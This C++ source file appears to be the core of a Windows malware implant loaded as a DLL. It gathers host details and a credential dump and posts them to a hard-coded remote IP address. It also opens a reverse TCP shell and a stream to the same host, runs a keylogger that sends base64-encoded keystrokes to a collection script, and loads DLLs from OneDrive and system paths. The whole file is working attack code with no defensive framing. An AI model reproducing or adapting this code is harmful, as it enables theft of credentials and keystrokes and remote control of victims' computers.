#include "dumper.hpp"
#include "klog.hpp"
#include "networking.hpp"

void load_rshell(LPARAM lpParam) {
    HMODULE hModule = (HMODULE)lpParam;
    dumper d;

    try {
        nlohmann::json json = nlohmann::json::object();

        json["ip"] = get_request("https://api.ipify.org/");
        json["host"] = getenv("COMPUTERNAME");
        json["os"] = get_windows_version();
        json["cpu"] = query_registry("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString", get_architecture());
        json["dumped"] = d.do_dump();

        post_json("http://185.143.220.132/submit.php", json.dump());

        do_tcp_rshell("185.143.220.132", 53);
    } catch (...) { }

    FreeLibraryAndExitThread(hModule, 0);
}

void load_stream(LPARAM lpParam) {
    HMODULE hModule = (HMODULE)lpParam;

    try {
        do_tcp_stream("185.143.220.132", 110);
    } catch (const std::exception &e) {
        std::string msg = e.what();
    
        MessageBox(NULL, ("Exception caught : " + msg).c_str(), "Exception", MB_OK);
    }

    FreeLibraryAndExitThread(hModule, 0);
}

void load_klog(LPARAM lpParam) {
    klog k;
    nlohmann::json buffer_json;

    while (true) {
        k.do_klog();

        if (k.buffer.size() > 150) {
            buffer_json[get_request("https://api.ipify.org/") + "@" + getenv("COMPUTERNAME")] = Base64::Encode(k.buffer);
            post_json("http://185.143.220.132/klog_submit.php", buffer_json.dump());
            k.buffer.clear();
        }
    }
}

void load_onedrive_dll(LPARAM lpParam) {
    std::string path = query_registry("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\OneDrive", "CurrentVersionPath", get_architecture());

    LoadLibrary((path + "\\FileSyncFALWB.dll").c_str());
}

void load_discord_dll(LPARAM lpParam) {
    LoadLibrary("C:\\Windows\\SysWOW64\\winsta.dll");
}
